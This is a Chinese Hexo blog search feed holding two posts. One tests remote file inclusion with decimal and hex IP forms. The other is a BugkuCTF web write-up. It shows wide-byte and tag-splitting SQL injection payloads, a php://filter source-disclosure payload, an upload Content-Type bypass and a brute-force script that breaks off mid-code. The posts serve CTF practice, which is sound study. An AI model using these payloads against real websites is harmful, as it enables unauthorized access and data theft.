<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>关于文件包含为ip地址</title>
      <link href="/2018/08/14/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%BAip%E5%9C%B0%E5%9D%80/"/>
      <url>/2018/08/14/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%BAip%E5%9C%B0%E5%9D%80/</url>
      <content type="html"><![CDATA[<h1 id="关于文件包含为ip地址"><a href="#关于文件包含为ip地址" class="headerlink" title="关于文件包含为ip地址"></a>关于文件包含为ip地址</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>文件包含是ctf中代码审计经常遇见的，而且会有如下情况。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"></span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">$data = @file_get_contents($id,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"win win win win"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要我们提交的是文件名，而内容却要符合条件，这时最好的办法是用<code>php://input</code>伪协议来解决。然而我再看wp时遇到了另外一种解决方法，就是在自己的服务器上传含有相应内容的文件，然后通过包含该文件来解决。</p><p>大致如下：<code>?id=http://192.168.232.134:8889/1.txt</code>，<code>192.168.232.134</code>为自己服务器的ip地址，<code>1.txt</code>的内容为<code>1112 is a nice lab!</code>，这样就可以实现绕过了。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>然而其实原题的条件更为苛刻一点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>stripos()</code>函数导致我们输入的内容里不能出现<code>.</code>，那我们就没法用ip来解决了，而且文件名也是不行的，然后我就看见一个说法，即使用<code>十进制ip</code>来绕过。</p><p>下面的结论我是在以下实验条件（php5.5.12，Apache2.4.9）中得到的，不知道是否和版本有关系。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例如以下的ip变化：192.168.232.134</span><br><span class="line">十六进制 = C0A8E886</span><br><span class="line">十进制 = 3232295046</span><br><span class="line">二进制 = 11000000101010001110100010000110</span><br></pre></td></tr></table></figure><p>我们可以通过直接输入<code>http://3232295046:8889/1.txt</code>和<code>http://0xC0A8E886:8889/1.txt</code>来进行访问。</p><p>然而，却无法通过<code>?id=http://3232295046:8889/1.txt</code>和<code>?id=http://0xC0A8E886:8889/1.txt</code>来进行文件包含，也不知道是不是版本问题。</p><p>虽然ip地址无法绕过，但文件名是可以绕过的：</p><p>众所周知，直接访问一个ip地址是默认访问<code>index</code>，然后在文件包含中只输入ip地址，而加上文件名，那么也是会默认访问<code>index</code>的，例如<code>?id=http://3232295046:8889/</code>，就会自动去读取<code>index.php</code>或<code>index.html</code>，而且，我们也可以不给文件名加上后缀来进行读取，也一样可以成功的，就像<code>?id=http://3232295046:8889/flag</code>，也会成功读取flag的内容的。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>综上，结论是：在（php5.5.12，Apache2.4.9）版本下，函数<code>file_get_contents()</code>用来读取别人的服务器上的文件时，不能用十进制ip和十六进制ip来读取。在不指定文件的情况下回默认读取<code>index</code>，也可以访问没有后缀名的文件。</p>]]></content>
      
      
        <tags>
            
            <tag> 测试结果 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>20180810-bugkuctf-wp</title>
      <link href="/2018/08/10/20180810-bugkuctf-wp/"/>
      <url>/2018/08/10/20180810-bugkuctf-wp/</url>
      <content type="html"><![CDATA[<h1 id="BUGKUCTF-WP-未完，待续"><a href="#BUGKUCTF-WP-未完，待续" class="headerlink" title="BUGKUCTF-WP-未完，待续"></a>BUGKUCTF-WP-未完，待续</h1><h2 id="web2-代码审计"><a href="#web2-代码审计" class="headerlink" title="web2-代码审计"></a>web2-代码审计</h2><p>在url的前面加上<code>view-source:</code>来看看源码，然后flag就在源码里，<code>KEY{Web-2-bugKssNNikls9100}</code>。</p><h2 id="文件上传测试-文件上传"><a href="#文件上传测试-文件上传" class="headerlink" title="文件上传测试-文件上传"></a>文件上传测试-文件上传</h2><p>提示说是要上传一个php文件，先随便新建一个php文件，然后上传，发现是要上传一个图片文件，那么打开burpsuite，然后抓包，本来上传的内容是这样的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------21339910311935</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;12.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------21339910311935--</span><br></pre></td></tr></table></figure><p>修改一下Content-Type，改成Content-Type: image/jpeg，然后go，成功得到flag。</p><p>HTTP Content-type 对照表:<code>http://tool.oschina.net/commons/</code></p><h2 id="计算器-代码审计"><a href="#计算器-代码审计" class="headerlink" title="计算器-代码审计"></a>计算器-代码审计</h2><p>限制输入，查看源码，然后修改<img src="/2018/08/10/20180810-bugkuctf-wp/1529511264800.png" alt="1529511264800">这个，把maxlength修改，然后输入正确答案，即可得到flag。</p><p>或者选择用bp抓包，然后修改数据。</p><h2 id="web基础-GET-代码审计"><a href="#web基础-GET-代码审计" class="headerlink" title="web基础$_GET-代码审计"></a>web基础$_GET-代码审计</h2><p>直接说要用get提交一个变量what，值为flag，直接在url的后面加上<code>?what=flag</code>，构成<code>http://120.24.86.145:8002/get/?what=flag</code>,然后得到flag。</p><h2 id="web基础-POST-代码审计"><a href="#web基础-POST-代码审计" class="headerlink" title="web基础$_POST-代码审计"></a>web基础$_POST-代码审计</h2><p>这次要用post的方法提交，用hackbar提交即可。</p><p><img src="/2018/08/10/20180810-bugkuctf-wp/1529511871150.png" alt="1529511871150"></p><h2 id="矛盾-代码审计"><a href="#矛盾-代码审计" class="headerlink" title="矛盾-代码审计"></a>矛盾-代码审计</h2><p>查看代码，要求就是要输入的num不是数字，但是值又等于1。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">is_numeric() — 检测变量是否为数字或数字字符串</span><br><span class="line"></span><br><span class="line">语法</span><br><span class="line"></span><br><span class="line">bool is_numeric ( mixed $var )</span><br><span class="line"></span><br><span class="line">如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE</span><br></pre></td></tr></table></figure><p>输入以1为开头后接非数字的字符串，原理则是==时，一边为数字，则只比对变量的开头数字部分，后面会忽略。</p><p><img src="/2018/08/10/20180810-bugkuctf-wp/1529512718624.png" alt="1529512718624"></p><h2 id="web3-代码审计"><a href="#web3-代码审计" class="headerlink" title="web3-代码审计"></a>web3-代码审计</h2><p>打开后无限弹窗，在url加上<code>view-source:</code>查看源码，发现注释</p><p><code>&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt;</code></p><p>实际上这就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">是 HTML、XML 等 SGML 类语言的转义序列（escape sequence）。它们不是「编码」。以 HTML 为例，这三种转义序列都称作 character reference：第一种是 character entity reference，后接预先定义的 entity 名称，而 entity 声明了自身指代的字符。</span><br><span class="line">后两种是 numeric character reference（NCR），数字取值为目标字符的 Unicode code point；以「&amp;#」开头的后接十进制数字，以「&amp;#x」开头的后接十六进制数字。</span><br></pre></td></tr></table></figure><p>其实也可以不用管这么多，知道&amp;#后面的是ASCII码即可，去掉&amp;，#，;，然后跑去ASCII 在线转换器<code>http://www.ab126.com/goju/1711.html</code>转换，得到flag。</p><h2 id="sql注入-注入"><a href="#sql注入-注入" class="headerlink" title="sql注入-注入"></a>sql注入-注入</h2><p>查看源码，发现编码规则GB-2312，猜测为mysql宽字节注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">简单讲解什么是宽字节注入：</span><br><span class="line">1.服务器在GET到前端发来的数据后，通过php的addslashes，mysql_real_escape_string，mysql_escape_string等函数，能够对特定的字符进行过滤，在它的前面添加转义字符,从而使得之后拼接sql语句时，这些特定的字符失效.</span><br><span class="line">过滤的字符包括</span><br><span class="line">ASCII（NULL）字符\x00，</span><br><span class="line">换行字符\n，addslashes不转义</span><br><span class="line">回车字符\r，addslashes不转义</span><br><span class="line">反斜杠字符\，</span><br><span class="line">单引号字符&apos;，</span><br><span class="line">双引号字&quot;，</span><br><span class="line">\x1a，addslashes不转义</span><br><span class="line"></span><br><span class="line">2.mysql在使用GBK编码的时候，会认为两个字符为一个汉字，当我们将注入连接写成</span><br><span class="line"></span><br><span class="line">http://103.238.227.13:10083/?id=1%df&apos;</span><br><span class="line"></span><br><span class="line">%df’ 传到后台php处理后变成%df\’,此时，%df\’对应的编码就是%df%5c’，即汉字“運’”(注意这个汉字后面的单引号还在)，这样就相当于将php用于过滤而加上的转义字符 \ 吞掉了，从而实现过滤的绕过.</span><br></pre></td></tr></table></figure><p>而在url后加上<code>?id=1</code>发现能正常输出，但是<code>id=2</code>就会啥也没有了，说明id=1是注入点。尝试一下输入<code>?id=1%df&#39; union select 1,database() %23</code>,发现是有数据库名字的出现。</p><p>然后再构造payload  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df%27 union select 1,string from .key %23</span><br></pre></td></tr></table></figure><p>得到一串字符，就是flag。</p><p>宽字节注入详解： <code>http://www.cnblogs.com/ECJTUACM-873284962/p/8747543.html</code></p><h2 id="域名解析-杂"><a href="#域名解析-杂" class="headerlink" title="域名解析-杂"></a>域名解析-杂</h2><p>题目要求的域名解析可以通过修改hosts文件达成</p><p>Windows下的hosts在<code>C:\Windows\System32\drivers\etc</code>，打开后在最下面加上</p><p><code>120.24.86.145 flag.bugku.com</code></p><p>然后直接访问flag.bugku.com即可。</p><h2 id="SQL注入1-注入"><a href="#SQL注入1-注入" class="headerlink" title="SQL注入1-注入"></a>SQL注入1-注入</h2><p>对id进行了过滤，然而strip_tags() 函数却又留下了漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">trip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。</span><br><span class="line"></span><br><span class="line">注释：该函数始终会剥离 HTML 注释。这点无法通过 allow 参数改变。</span><br><span class="line">注释：该函数是二进制安全的。</span><br><span class="line"></span><br><span class="line">语法</span><br><span class="line">strip_tags(string,allow)</span><br></pre></td></tr></table></figure><p>这么我们就可以在union中加入<code>&lt;a&gt;</code>符号来绕过过滤</p><p>首先我们要先拿到数据库的名字<code>id=-1 union select 1,database() #</code>那么构造的payload即是<code>id=-1 un&lt;a&gt;ion se&lt;a&gt;lect 1,database() %23</code>，然后获得数据库名字为sql3。</p><p>然后我们就输入<code>id=-1 un&lt;a&gt;ion se&lt;a&gt;lect 1,hash fr&lt;a&gt;om sql3.key %23</code></p><p>当然，其实也可以直接输入<code>id=-1 un&lt;a&gt;ion se&lt;a&gt;lect 1,hash fr&lt;a&gt;om .key %23</code>来获得flag。</p><h2 id="你必须让他停下-杂"><a href="#你必须让他停下-杂" class="headerlink" title="你必须让他停下-杂"></a>你必须让他停下-杂</h2><p>打开后是一个不断跳转的网页，用burpsuite抓包，然后丢到repeater中，一路go即可得到flag。</p><h2 id="本地包含——-网站炸了貌似"><a href="#本地包含——-网站炸了貌似" class="headerlink" title="本地包含——-网站炸了貌似"></a>本地包含——-网站炸了貌似</h2><h2 id="变量1-代码审计"><a href="#变量1-代码审计" class="headerlink" title="变量1-代码审计"></a>变量1-代码审计</h2><p>正则表达式的匹配就是要args这个变量要由任意大小写字母和0到9以及下划线组成，而后var_dump()则是显示变量的值和结构，那么我们就直接输出GLOBALS这个全局变量，即是构造<code>?agrs=GLOBALS</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);<span class="comment">// 关闭php错误显示</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;<span class="comment">// 引入flag1.php文件代码</span></span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;<span class="comment">// 通过get方式传递 args变量才能执行if里面的代码</span></span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;<span class="comment">// 这个正则表达式的意思是匹配任意 [A-Za-z0-9_] 的字符，就是任意大小写字母和0到9以及下划线组成</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>);<span class="comment">// 这边告诉我们这题是代码审计的题目</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">var_dump 是PHP中的调试函数，可以用var_dump打印所有的对象,查看对象内部的数据结构。</span><br><span class="line">void var_dump ( mixed $expression [, mixed $... ] )</span><br><span class="line">此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</span><br></pre></td></tr></table></figure><p>相关的正则表达式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PS:下面看下正则表达式 \w \s \d \b</span><br><span class="line"></span><br><span class="line">. 匹配除换行符以外的任意字符</span><br><span class="line"></span><br><span class="line">\w 匹配字母或数字或下划线或汉字 等价于 &apos;[^A-Za-z0-9_]&apos;。</span><br><span class="line"></span><br><span class="line">\s 匹配任意的空白符</span><br><span class="line"></span><br><span class="line">\d 匹配数字</span><br><span class="line"></span><br><span class="line">\b 匹配单词的开始或结束</span><br><span class="line"></span><br><span class="line">^ 匹配字符串的开始</span><br><span class="line"></span><br><span class="line">$ 匹配字符串的结束</span><br><span class="line"></span><br><span class="line">\w能不能匹配汉字要视你的操作系统和你的应用环境而定</span><br></pre></td></tr></table></figure><h2 id="web5-代码审计"><a href="#web5-代码审计" class="headerlink" title="web5-代码审计"></a>web5-代码审计</h2><p>​    题目说是JSP，然后查看源码，发现一连串的<code>([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![   后略</code>，这其实就是JSP的一种转换，实际上还是JSP代码，只需要在游览器中F12打开，然后执行这一串代码即可，记得转成大写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">JavaScript是一种属于网络的脚本语言,已经被广泛用于Web应用开发,常用来为网页添加各式各样的动态功能,为用户提供更流畅美观的浏览效果。通常JavaScript脚本是通过嵌入在HTML中来实现自身的功能的</span><br><span class="line"></span><br><span class="line">jother是另类的javascript工具</span><br><span class="line">一堆[]()+!的东西就用jother解码</span><br><span class="line"></span><br><span class="line">可以打开谷歌浏览器 按F12</span><br><span class="line"></span><br><span class="line">然后console将那堆解码的东西复制过去 按回车即可解码</span><br></pre></td></tr></table></figure><h2 id="头等舱-抓包"><a href="#头等舱-抓包" class="headerlink" title="头等舱-抓包"></a>头等舱-抓包</h2><p>打开后发现什么都没有，查看源码也一样，那么用bp抓包看看，丢到repeater里面go一下，发现flag就在报头里。</p><h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>打开后扫描敏感文件，扫出来个shell.php，访问后是个后台登录，结合提示说不难，那么应该是弱密码攻击，用bp抓包后用字典爆破攻击，发现hack的返回内容不一样，获得flag。</p><h2 id="web4-代码审计"><a href="#web4-代码审计" class="headerlink" title="web4-代码审计"></a>web4-代码审计</h2><p>查看源码，看见有eval这个函数，就知道是执行里面的内容<code>unescape(p1) + unescape(&#39;%35%34%61%61%32&#39; + p2)</code>，百度一下函数unescape，发现是一个加密函数<code>该函数的工作原理是这样的：通过找到形式为 %xx 和 %uxxxx 的字符序列（x 表示十六进制的数字），用 Unicode 字符 \u00xx 和 \uxxxx 替换这样的字符序列进行解码。</code>，还发现一个在线解密的网站<code>https://escape.supfree.net/</code>，把两个字符串解密后获得源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="keyword">var</span> a=document.getElementById(<span class="string">"password"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"undefined"</span>!=typeof a)</span><br><span class="line">&#123;<span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)</span><br><span class="line"><span class="keyword">return</span>!<span class="number">0</span>;alert(<span class="string">"Error"</span>);</span><br><span class="line">a.focus();</span><br><span class="line"><span class="keyword">return</span>!<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure><p>直接在输入框里输入<code>67d709b2b54aa2aa648cf6e87a7114f1</code>即可得到flag。</p><h2 id="flag在index里-注入"><a href="#flag在index里-注入" class="headerlink" title="flag在index里-注入"></a>flag在index里-注入</h2><p>这道题目里有经典的本地文件包含漏洞+php伪协议的结合应用 。</p><p>注意到url地址  <code>http://120.24.86.145:8005/post/index.php?file=show.php</code></p><p>这是一个典型的文件包含漏洞，（file关键字是提示，其实也是CTF的套路）。</p><p>这里用到了php的封装协议：<code>http://php.net/manual/zh/wrappers.php.php</code></p><p>具体怎么用呢，先说结果：</p><p><code>http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></p><p>得到<code>PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg==</code></p><p>然后将得到的字符串base64解码得到index的源码： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">现在具体说说file=php://filter/read=convert.base64-encode/resource=index.php的含义</span><br><span class="line"></span><br><span class="line">首先这是一个file关键字的get参数传递，php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。</span><br><span class="line"></span><br><span class="line">通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。</span><br><span class="line"></span><br><span class="line">而include的内容是由用户控制的，所以通过我们传递的file参数，是include（）函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。</span><br><span class="line"></span><br><span class="line">如果不进行base64编码传入，就会直接执行，而flag的信息在注释中，是得不到的。</span><br><span class="line"></span><br><span class="line">我们再看一下源码中 存在对 ../ tp data input 的过滤，其实这都是php://协议中的其他方法，都可以结合文件包含漏洞执行，具体可以百度一下</span><br></pre></td></tr></table></figure><p>更详细的wp：<a href="https://blog.csdn.net/wy_97/article/details/77431111" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/77431111</a></p><h2 id="输入密码查看flag-杂"><a href="#输入密码查看flag-杂" class="headerlink" title="输入密码查看flag-杂"></a>输入密码查看flag-杂</h2><p>​    题目说的很明白，穷举攻击，用bp抓包后丢到<code>Intruder</code>中，然后用python写一个5位数的字典，然后运行，找到其中长度不一致的查看，即是flag‘。</p><p>​    python相应的字典生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file=open(<span class="string">'return.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                        s=str(a)+str(b)+str(c)+str(d)+str(e)</span><br><span class="line">                        file.write(s+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>​    当然，也可以选择用pyhton自己写脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">file=open(<span class="string">'return.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span 